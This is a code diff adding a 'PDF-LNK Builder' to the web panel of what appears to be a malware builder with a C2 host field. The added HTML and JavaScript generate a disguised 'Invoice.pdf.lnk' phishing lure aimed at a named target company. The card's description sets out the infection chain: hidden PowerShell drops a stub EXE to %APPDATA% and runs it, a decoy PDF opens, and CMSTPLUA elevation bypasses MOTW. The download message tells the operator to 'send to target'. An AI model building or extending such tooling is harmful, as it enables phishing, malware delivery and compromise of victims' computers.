@@ -662,6 +662,70 @@ function renderBuilder() {
   </div>
 </div>
 
+<div class="card" style="max-width:680px;margin:0 auto;border:1px solid var(--accent)">
+  <div class="card-title" style="color:var(--accent)">&#128279; PDF-LNK Builder &mdash; Works in Edge &amp; Chrome</div>
+  <p style="font-size:12px;color:var(--muted);line-height:1.6;margin-bottom:10px">
+    Creates a <code style="color:var(--accent)">Invoice.pdf.lnk</code> file. Windows hides <code>.lnk</code> so it
+    appears as <code style="color:var(--accent)">Invoice.pdf</code> with a PDF icon. Double-click runs the Windows
+    Shell handler &mdash; Edge and Chrome are never invoked. The file self-contains both the
+    decoy PDF and the stub (no separate download needed on delivery).
+    Optionally upload your own PDF; otherwise an invoice is auto-generated.
+  </p>
+
+  <div style="background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:8px;margin-bottom:10px">
+    <div style="font-size:11px;font-weight:600;color:var(--light)">&#9881; Configuration</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px" id="pdflnk-grid">
+      <div>
+        <label style="font-size:10px;color:var(--muted);display:block;margin-bottom:3px">C2 Host (auto-filled from Builder)</label>
+        <input id="pdflnk-host" type="text" placeholder="e.g. 192.168.1.10:4444"
+          style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px;outline:none">
+      </div>
+      <div>
+        <label style="font-size:10px;color:var(--muted);display:block;margin-bottom:3px">Document filename (no extension)</label>
+        <input id="pdflnk-filename" type="text" value="Invoice_Q4-2024"
+          style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px;outline:none">
+      </div>
+      <div>
+        <label style="font-size:10px;color:var(--muted);display:block;margin-bottom:3px">From (sender company)</label>
+        <input id="pdflnk-from" type="text" value="Nexus Solutions Ltd."
+          style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px;outline:none">
+      </div>
+      <div>
+        <label style="font-size:10px;color:var(--muted);display:block;margin-bottom:3px">Bill To (target company)</label>
+        <input id="pdflnk-to" type="text" value="Acme Corporation"
+          style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px;outline:none">
+      </div>
+    </div>
+  </div>
+
+  <div style="background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:8px;margin-bottom:10px">
+    <div style="font-size:11px;font-weight:600;color:var(--light)">&#128228; Upload your own PDF decoy (optional)</div>
+    <p style="font-size:11px;color:var(--muted);line-height:1.5;margin:0">
+      Leave empty to embed the auto-generated invoice PDF. Upload any real document to use it as the visible decoy instead.
+    </p>
+    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+      <input id="pdflnk-pdf-input" type="file" accept=".pdf"
+        style="flex:1;min-width:180px;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px">
+      <button class="btn" onclick="clearPdfLnkUpload()"
+        style="font-size:11px;padding:6px 10px;background:var(--bg2);border-color:var(--bg3);color:var(--muted)">Clear</button>
+    </div>
+  </div>
+
+  <button id="pdflnk-btn" class="btn" onclick="downloadPdfLnk()"
+    style="width:100%;padding:10px;font-size:13px;font-weight:600">
+    &#128279; Build &amp; Download PDF-LNK
+  </button>
+  <div id="pdflnk-status" style="font-size:11px;color:var(--muted);display:none;margin-top:8px"></div>
+
+  <div style="margin-top:10px;font-size:11px;color:var(--muted);line-height:1.7;background:var(--bg);border-radius:8px;padding:10px">
+    <b style="color:var(--light)">How it works:</b> Shell opens <code>.lnk</code> directly &rarr; hidden PowerShell reads
+    the <code>.lnk</code> file from disk, extracts decoy PDF bytes &rarr; opens it in default viewer,
+    extracts stub EXE &rarr; drops to <code>%APPDATA%\OneDriveHelper.exe</code> &rarr; runs (no MOTW &rarr; CMSTPLUA elevation).<br>
+    <b style="color:var(--light)">Icon:</b> imageres.dll PDF icon. Extension hidden by default in all Windows versions.<br>
+    <b style="color:var(--light)">MITRE:</b> T1566.001 + T1204.002 + T1547.009 (LNK persistence vector)
+  </div>
+</div>
+
 <div class="card" style="max-width:680px;margin:0 auto">
   <div class="card-title">&#128275; Carrier Detection Chain</div>
   <p style="font-size:12px;color:var(--muted);line-height:1.6;margin-bottom:8px">
@@ -939,6 +1003,60 @@ async function injectAndDownload() {
     status.textContent = 'Error: ' + e.message;
   } finally {
     btn.disabled = false; btn.textContent = 'Inject /Launch + Download';
+  }
+}
+
+function clearPdfLnkUpload() {
+  const inp = document.getElementById('pdflnk-pdf-input');
+  if (inp) inp.value = '';
+}
+
+async function downloadPdfLnk() {
+  const btn    = document.getElementById('pdflnk-btn');
+  const status = document.getElementById('pdflnk-status');
+
+  const host     = (document.getElementById('pdflnk-host')?.value.trim()     || document.getElementById('b-host')?.value.trim() || '');
+  const filename = (document.getElementById('pdflnk-filename')?.value.trim() || 'Invoice_Q4-2024');
+  const from     = (document.getElementById('pdflnk-from')?.value.trim()     || '');
+  const to       = (document.getElementById('pdflnk-to')?.value.trim()       || '');
+  const fileInp  = document.getElementById('pdflnk-pdf-input');
+
+  const fd = new FormData();
+  fd.append('host',     host);
+  fd.append('filename', filename);
+  fd.append('from',     from);
+  fd.append('to',       to);
+  if (fileInp?.files?.length) fd.append('pdf', fileInp.files[0]);
+
+  btn.disabled = true; btn.textContent = 'Building…';
+  status.style.display = 'block'; status.style.color = 'var(--muted)';
+  status.textContent = 'Building self-contained PDF-LNK carrier…';
+
+  try {
+    const r = await fetch(API_BASE + '/api/builder/pdf-lnk', {
+      method: 'POST', body: fd, credentials: 'include'
+    });
+    if (!r.ok) {
+      const e = await r.json().catch(() => ({ error: r.statusText }));
+      status.style.color = '#e74c3c';
+      status.textContent = 'Error: ' + (e.error || r.statusText);
+      return;
+    }
+    const blob = await r.blob();
+    const cd   = r.headers.get('content-disposition') || '';
+    const nm   = (cd.match(/filename="([^"]+)"/) || [])[1] || filename + '.pdf.lnk';
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement('a');
+    a.href = url; a.download = nm;
+    document.body.appendChild(a); a.click(); a.remove();
+    URL.revokeObjectURL(url);
+    status.style.color = 'var(--accent)';
+    status.textContent = '✓ ' + nm + ' downloaded — send to target, double-click runs stub + opens PDF.';
+  } catch (e) {
+    status.style.color = '#e74c3c';
+    status.textContent = 'Error: ' + e.message;
+  } finally {
+    btn.disabled = false; btn.textContent = '🔗 Build & Download PDF-LNK';
   }
 }
 
